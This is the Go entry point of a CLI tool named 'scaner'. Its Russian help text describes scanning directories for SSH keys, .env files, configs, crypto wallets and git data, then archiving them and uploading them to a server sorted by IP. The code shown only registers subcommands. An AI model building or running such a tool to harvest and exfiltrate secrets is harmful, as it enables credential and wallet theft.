package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
	"github.com/tumarsal/scaner/cmd/download"
	"github.com/tumarsal/scaner/cmd/ls"
	"github.com/tumarsal/scaner/cmd/scan"
	"github.com/tumarsal/scaner/cmd/upload"
)

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintf(os.Stderr, "Ошибка: %v\n", err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Use:   "scaner",
	Short: "Инструмент для поиска, архивирования и выгрузки конфиденциальных файлов",
	Long: `Scaner - инструмент для поиска и архивирования конфиденциальных файлов,
выгрузки папок на сервер.

Режимы:
  scan     — сканирование директории (SSH ключи, .env, конфиги, кошельки, git), архивирование или загрузка на сервер
  upload   — упаковка папки в zip (с опциональным разбиением по размеру) и выгрузка на сервер
  download — скачивание всех файлов с сервера для указанного IP в папку (имена как на сервере, дубликаты — суффикс _1, _2, ...)
  ls       — дерево удалённого хранилища с датой обновления (все IP или один с --ip)`,
}

func init() {
	rootCmd.AddCommand(scan.Command())
	rootCmd.AddCommand(upload.Command())
	rootCmd.AddCommand(download.Command())
	rootCmd.AddCommand(ls.Command())
}
